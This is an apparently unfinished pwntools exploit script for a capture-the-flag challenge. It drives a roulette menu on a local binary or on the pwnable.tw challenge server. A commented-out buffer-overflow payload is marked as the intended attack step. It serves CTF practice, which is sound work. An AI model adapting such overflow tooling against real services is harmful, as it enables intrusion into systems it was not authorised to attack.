from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
context.log_level = 'DEBUG'
DEBUG = 1
file = './chal'
exe  = ELF(file)


def roulette(io, number):
    success("===================<ROULETTE>=================")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", number)
    success("===================</ROULETTE>================")

def main(io, libc):
    # declared
    # exploit
    success("Select 1. Pay")
    io.sendlineafter(b"> ", b"1")   # select Pay

    for i in range(11):
        roulette(io, b"1")
    



    # # less than 6 diamonds
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"a")

    # # overflow here, last chance run by a thread
    # payload = b"\x7f"*0x900
    # io.sendlineafter(b"> ", payload)


if __name__ == '__main__':
    if DEBUG:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        libc = ELF('./libc-2.27.so')
        io = remote('chall.pwnable.tw', 1337)
    
    main(io, libc)
    io.interactive()